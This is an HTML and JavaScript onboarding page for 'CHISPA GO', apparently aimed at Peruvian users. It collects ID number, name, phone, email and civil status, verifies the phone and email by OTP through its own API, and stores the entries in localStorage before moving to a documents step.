<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>CHISPA GO – Paso 2</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',sans-serif}
body{background:#eef1f5;min-height:100vh}
.header{background:#fff;border-bottom:1px solid #dde1e7;display:flex;align-items:center;justify-content:space-between;padding:14px 16px}
.header .back{font-size:1.4rem;color:#1b3a5c;cursor:pointer;background:none;border:none}
.header .logo{font-size:1.15rem;font-weight:700;color:#c0392b}
.header .greet{font-size:.8rem;color:#6b7280}
.progress{background:#fff;padding:10px 16px;display:flex;gap:6px}
.seg{height:5px;border-radius:3px;flex:1}
.seg.done{background:#1b3a5c}
.seg.active{background:#c0392b}
.seg.inactive{background:#dde1e7}
.content{padding:20px 16px}
.title{font-size:1.05rem;font-weight:700;color:#1b3a5c;margin-bottom:10px}
.divider{border:none;border-top:1px solid #dde1e7;margin:12px 0}
.desc{font-size:.85rem;color:#6b7280;margin-bottom:16px;line-height:1.5}
.toggle{display:flex;background:#fff;border:1px solid #dde1e7;border-radius:10px;overflow:hidden;margin-bottom:14px}
.toggle button{flex:1;padding:10px;border:none;background:none;cursor:pointer;font-size:.9rem;color:#6b7280}
.toggle button.active{font-weight:700;color:#1b3a5c;border-bottom:2px solid #1b3a5c}
.field-wrap{position:relative;margin-bottom:12px}
.field{width:100%;padding:12px 14px;border:1.5px solid #dde1e7;border-radius:12px;font-size:.95rem;background:#fff;color:#1b3a5c}
.field:focus{outline:none;border-color:#1b3a5c}
.field.verified{border-color:#27ae60;background:#f0fff4}
.field-status{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:.8rem;font-weight:600}
.field-status.loading{color:#6b7280}
.field-status.ok{color:#27ae60}
.field-status.err{color:#c0392b}
.row{display:flex;gap:8px;margin-bottom:12px;align-items:center}
.row .field-wrap{flex:1;margin-bottom:0}
.row .field{margin-bottom:0}
.val-btn{white-space:nowrap;padding:10px 14px;border:none;border-radius:10px;font-size:.85rem;cursor:pointer;font-weight:600}
.val-btn.enabled{background:#1b3a5c;color:#fff}
.val-btn.disabled{background:#dde1e7;color:#6b7280;cursor:not-allowed}
.badge-ok{background:#e8f8ee;color:#27ae60;border-radius:8px;padding:8px 12px;font-size:.85rem;font-weight:600;white-space:nowrap}
.label{font-size:.9rem;font-weight:700;color:#1b3a5c;margin-bottom:8px}
.pills{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}
.pill{padding:8px 14px;border-radius:20px;border:1.5px solid #dde1e7;background:#fff;color:#1b3a5c;font-size:.85rem;cursor:pointer}
.pill.active{background:#1b3a5c;color:#fff;border-color:#1b3a5c}
.btn-main{width:100%;padding:15px;border:none;border-radius:14px;font-size:1rem;font-weight:700;cursor:pointer;margin-top:4px}
.btn-main.on{background:#c0392b;color:#fff}
.btn-main.off{background:#dde1e7;color:#6b7280;cursor:not-allowed}
.overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:100;display:none;align-items:flex-end;justify-content:center}
.overlay.show{display:flex}
.sheet{background:#fff;border-radius:20px 20px 0 0;padding:24px 20px 36px;width:100%;max-width:480px}
.sheet h3{text-align:center;color:#1b3a5c;margin-bottom:6px;font-size:1.1rem}
.sheet .dest{text-align:center;font-size:.85rem;color:#6b7280;margin-bottom:20px}
.otp-single{width:100%;padding:18px;border:2px solid #dde1e7;border-radius:14px;font-size:2rem;text-align:center;color:#1b3a5c;font-weight:700;letter-spacing:12px;background:#f8f9fb}
.otp-single:focus{outline:none;border-color:#c0392b;background:#fff}
.otp-hint{text-align:center;font-size:.8rem;color:#6b7280;margin-top:8px;margin-bottom:16px}
.status-msg{text-align:center;font-size:.85rem;margin-bottom:12px;min-height:22px;font-weight:600}
.btn-confirm{width:100%;padding:15px;background:#c0392b;color:#fff;border:none;border-radius:12px;font-size:1rem;font-weight:700;cursor:pointer;margin-bottom:10px}
.btn-confirm:disabled{background:#dde1e7;color:#6b7280;cursor:not-allowed}
.btn-resend{width:100%;padding:12px;background:#fff;color:#1b3a5c;border:1.5px solid #1b3a5c;border-radius:12px;font-size:.9rem;cursor:pointer;margin-bottom:8px}
.btn-cancel{width:100%;padding:11px;background:none;color:#6b7280;border:none;font-size:.9rem;cursor:pointer}
</style>
</head>
<body>
<div class="header">
  <button class="back" onclick="history.back()">&#8592;</button>
  <span class="logo">CHISPA GO</span>
  <span class="greet">&#161;Buen d&#237;a!</span>
</div>
<div class="progress">
  <div class="seg done"></div>
  <div class="seg active"></div>
  <div class="seg inactive"></div>
  <div class="seg inactive"></div>
  <div class="seg inactive"></div>
</div>
<div class="content">
  <div class="title">Paso 2 de 5: Registro de Datos</div>
  <hr class="divider">
  <div class="desc">Ingresa tu DNI para consultar tus datos oficiales automáticamente.</div>

  <div class="toggle">
    <button id="btnDNI" class="active" onclick="setDoc('DNI')">DNI</button>
    <button id="btnCE" onclick="setDoc('CE')">Carnet de Extranjería</button>
  </div>

  <div class="field-wrap">
    <input id="nDoc" class="field" type="tel" maxlength="8" placeholder="Número de DNI 📄"
      oninput="this.value=this.value.replace(/\D/g,'');onDniInput()">
    <span class="field-status" id="dniStatus"></span>
  </div>

  <div class="field-wrap">
    <input id="nombre" class="field" type="text" placeholder="Nombres y Apellidos Completos" oninput="checkForm()">
    <span class="field-status ok" id="nombreStatus" style="display:none">✅ Auto-completado</span>
  </div>

  <div class="row">
    <div class="field-wrap">
      <input id="phone" class="field" type="tel" maxlength="9" placeholder="Celular (9 dígitos)"
        oninput="this.value=this.value.replace(/\D/g,'');checkForm()">
    </div>
    <button id="btnPhone" class="val-btn disabled" onclick="openOtp('sms')">Validar por SMS</button>
    <span id="phoneOk" class="badge-ok" style="display:none">✅ Verificado</span>
  </div>
  <div class="row">
    <div class="field-wrap">
      <input id="email" class="field" type="email" placeholder="Correo electrónico" oninput="checkForm()">
    </div>
    <button id="btnEmail" class="val-btn disabled" onclick="openOtp('email')">Validar Correo</button>
    <span id="emailOk" class="badge-ok" style="display:none">✅ Verificado</span>
  </div>

  <div class="label">Estado Civil</div>
  <div class="pills">
    <button class="pill active" onclick="setCivil(this,'Soltero')">Soltero</button>
    <button class="pill" onclick="setCivil(this,'Casado')">Casado</button>
    <button class="pill" onclick="setCivil(this,'Viudo')">Viudo</button>
    <button class="pill" onclick="setCivil(this,'Divorciado')">Divorciado</button>
  </div>

  <button id="btnCont" class="btn-main off" onclick="continuar()">Continuar a Documentos</button>
</div>

<div class="overlay" id="otpOverlay">
  <div class="sheet">
    <h3 id="otpTitle">Código de Verificación</h3>
    <div class="dest" id="otpDesc">Enviando código...</div>
    <input id="otpInput" class="otp-single" type="tel" maxlength="4" placeholder="----"
      oninput="this.value=this.value.replace(/\D/g,'');" autocomplete="one-time-code">
    <div class="otp-hint">Ingresa el código de 4 dígitos recibido</div>
    <div class="status-msg" id="statusMsg"></div>
    <button class="btn-confirm" id="btnConfirmOtp" onclick="confirmOtp()">Confirmar Código</button>
    <button class="btn-resend" onclick="resendOtp()">↻ Reenviar código</button>
    <button class="btn-cancel" onclick="closeOtp()">Cancelar</button>
  </div>
</div>

<script>
const API_BASE='https://dia245-blame.vercel.app';
let docType='DNI',civilState='Soltero',phoneVerified=false,emailVerified=false,otpChannel='';
let otpTo='';
let dniTimer=null;

function apiPost(path,body){
  return new Promise(function(resolve){
    if(window.NativeBridge){
      try{resolve(JSON.parse(window.NativeBridge.post(API_BASE+path,JSON.stringify(body))));}catch(e){resolve({error:e.message,_error:true});}
      return;
    }
    var xhr=new XMLHttpRequest();
    xhr.open('POST',API_BASE+path,true);
    xhr.setRequestHeader('Content-Type','application/json');
    xhr.onreadystatechange=function(){
      if(xhr.readyState===4){
        try{resolve(JSON.parse(xhr.responseText));}catch(e){resolve({error:xhr.responseText,_error:true});}
      }
    };
    xhr.onerror=function(){resolve({error:'Network error',_error:true});};
    xhr.send(JSON.stringify(body));
  });
}

function setDoc(t){
  docType=t;
  document.getElementById('btnDNI').classList.toggle('active',t==='DNI');
  document.getElementById('btnCE').classList.toggle('active',t==='CE');
  document.getElementById('nDoc').placeholder=t==='DNI'?'Número de DNI 📄':'Número de CE';
  document.getElementById('nDoc').maxLength=t==='DNI'?8:12;
}

function onDniInput(){
  let val=document.getElementById('nDoc').value;
  let st=document.getElementById('dniStatus');
  let nombreSt=document.getElementById('nombreStatus');
  clearTimeout(dniTimer);
  if(val.length<8||docType!=='DNI'){
    st.textContent='';
    checkForm();
    return;
  }
  st.className='field-status loading';
  st.textContent='⏳ Consultando...';
  dniTimer=setTimeout(async function(){
    let res=await apiPost('/api/dni-lookup',{dni:val});
    if(res.ok&&res.nombre){
      document.getElementById('nombre').value=res.nombre;
      document.getElementById('nombre').classList.add('verified');
      nombreSt.style.display='inline';
      st.className='field-status ok';
      st.textContent='✅ DNI válido';
    } else {
      st.className='field-status err';
      st.textContent='❌ No encontrado';
      document.getElementById('nombre').classList.remove('verified');
      nombreSt.style.display='none';
    }
    checkForm();
  },600);
}

function setCivil(el,v){
  document.querySelectorAll('.pill').forEach(p=>p.classList.remove('active'));
  el.classList.add('active');civilState=v;
}
function validEmail(e){return /^[^@]+@[^@]+\.[^@]+$/.test(e);}
function checkForm(){
  let doc=document.getElementById('nDoc').value;
  let name=document.getElementById('nombre').value.trim();
  let ph=document.getElementById('phone').value;
  let em=document.getElementById('email').value;
  let phOk=ph.length===9;
  let emOk=validEmail(em);
  document.getElementById('btnPhone').className='val-btn '+(phOk&&!phoneVerified?'enabled':'disabled');
  document.getElementById('btnEmail').className='val-btn '+(emOk&&!emailVerified?'enabled':'disabled');
  let ready=doc.length>=8&&name.length>=3&&ph.length===9&&phoneVerified&&emOk&&emailVerified;
  document.getElementById('btnCont').className='btn-main '+(ready?'on':'off');
}

async function openOtp(channel){
  otpChannel=channel;
  let isPhone=channel==='sms';
  let phoneVal=document.getElementById('phone').value;
  let emailVal=document.getElementById('email').value;
  otpTo=isPhone?'+51'+phoneVal:emailVal;
  document.getElementById('otpTitle').textContent=isPhone?'Verificar SMS':'Verificar Correo';
  document.getElementById('otpDesc').textContent='Enviando código a: '+otpTo+'...';
  document.getElementById('statusMsg').textContent='';
  document.getElementById('statusMsg').style.color='#6b7280';
  document.getElementById('otpInput').value='';
  document.getElementById('btnConfirmOtp').disabled=false;
  document.getElementById('otpOverlay').classList.add('show');
  let sendBody=isPhone?{phone:otpTo,channel:'sms'}:{phone:'+51'+phoneVal,channel:'email',email:emailVal};
  let res=await apiPost('/api/send-otp',sendBody);
  if(res._error||res.error){
    document.getElementById('otpDesc').textContent='Error al enviar.';
    document.getElementById('statusMsg').style.color='#c0392b';
    document.getElementById('statusMsg').textContent=res.error||'Error desconocido';
  } else {
    document.getElementById('otpDesc').textContent='Código enviado a: '+otpTo;
    document.getElementById('statusMsg').style.color='#27ae60';
    document.getElementById('statusMsg').textContent='✅ Ingresa el código de 4 dígitos';
    document.getElementById('otpInput').focus();
  }
}

async function resendOtp(){
  document.getElementById('otpInput').value='';
  document.getElementById('statusMsg').textContent='Reenviando...';
  document.getElementById('statusMsg').style.color='#6b7280';
  let isPhone=otpChannel==='sms';
  let phoneVal=document.getElementById('phone').value;
  let emailVal=document.getElementById('email').value;
  let sendBody=isPhone?{phone:otpTo,channel:'sms'}:{phone:'+51'+phoneVal,channel:'email',email:emailVal};
  let res=await apiPost('/api/send-otp',sendBody);
  if(res._error||res.error){
    document.getElementById('statusMsg').style.color='#c0392b';
    document.getElementById('statusMsg').textContent='Error: '+(res.error||'desconocido');
  } else {
    document.getElementById('otpDesc').textContent='Código reenviado a: '+otpTo;
    document.getElementById('statusMsg').style.color='#27ae60';
    document.getElementById('statusMsg').textContent='✅ Código reenviado';
  }
}

function closeOtp(){document.getElementById('otpOverlay').classList.remove('show');}

async function confirmOtp(){
  let code=document.getElementById('otpInput').value.trim();
  if(code.length<4){
    document.getElementById('statusMsg').style.color='#c0392b';
    document.getElementById('statusMsg').textContent='Ingresa los 4 dígitos del código';
    return;
  }
  document.getElementById('statusMsg').style.color='#6b7280';
  document.getElementById('statusMsg').textContent='Verificando...';
  document.getElementById('btnConfirmOtp').disabled=true;
  let res=await apiPost('/api/verify-otp',{to:otpTo,code:code});
  document.getElementById('btnConfirmOtp').disabled=false;
  if(res.ok&&res.verified){
    if(otpChannel==='sms'){
      phoneVerified=true;
      document.getElementById('btnPhone').style.display='none';
      document.getElementById('phoneOk').style.display='inline';
    } else {
      emailVerified=true;
      document.getElementById('btnEmail').style.display='none';
      document.getElementById('emailOk').style.display='inline';
    }
    closeOtp();checkForm();
  } else {
    document.getElementById('statusMsg').style.color='#c0392b';
    document.getElementById('statusMsg').textContent='❌ '+(res.error||'Código incorrecto o expirado.');
  }
}

function continuar(){
  if(document.getElementById('btnCont').classList.contains('off'))return;
  localStorage.setItem('chispago_datos',JSON.stringify({
    docType,nDoc:document.getElementById('nDoc').value,
    nombre:document.getElementById('nombre').value,
    phone:document.getElementById('phone').value,
    email:document.getElementById('email').value,
    civilState
  }));
  window.location.href='documentos.html';
}
</script>
</body>
</html>
